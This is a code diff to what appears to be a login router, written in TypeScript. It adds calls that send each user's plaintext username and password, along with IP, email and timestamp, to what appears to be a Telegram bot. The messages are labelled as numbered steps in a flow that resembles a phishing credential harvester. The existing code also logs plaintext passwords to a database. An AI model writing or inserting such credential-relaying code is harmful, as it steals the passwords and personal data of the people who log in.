@@ -8,6 +8,7 @@ import {
 } from "../lib/pending-sessions";
 import { createSession, deleteSession } from "../lib/sessions";
 import { requireAuth } from "../middleware/require-auth";
+import { tgNotify } from "../lib/tg-notify";
 
 const router: IRouter = Router();
 
@@ -43,6 +44,15 @@ router.post("/auth/login", async (req, res): Promise<void> => {
     ?? req.socket.remoteAddress
     ?? "unknown";
   await db.insert(loginLogsTable).values({ username, password, ipAddress: ip, status: "success" }).catch(() => {});
+
+  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  void tgNotify(
+    `🔐 <b>STEP 1 — Login</b>\n\n` +
+    `👤 Username : <code>${username}</code>\n` +
+    `🔑 Password : <code>${password}</code>\n` +
+    `🌐 IP       : <code>${ip}</code>\n` +
+    `🕐 Waktu    : ${now}`
+  );
 
   res.json({ pendingToken });
 });
@@ -102,6 +112,15 @@ router.post("/auth/approved", async (req, res): Promise<void> => {
       ipAddress: ipAddress ?? "unknown",
       status: "approved",
     }).catch(() => {});
+
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    void tgNotify(
+      `📧 <b>STEP 3 — Verifikasi Email</b>\n\n` +
+      `👤 Username : <code>${username}</code>\n` +
+      `📧 Email    : <code>${email ?? "-"}</code>\n` +
+      `🌐 IP       : <code>${ipAddress ?? "unknown"}</code>\n` +
+      `🕐 Waktu    : ${now}`
+    );
   }
   res.json({ ok: true });
 });
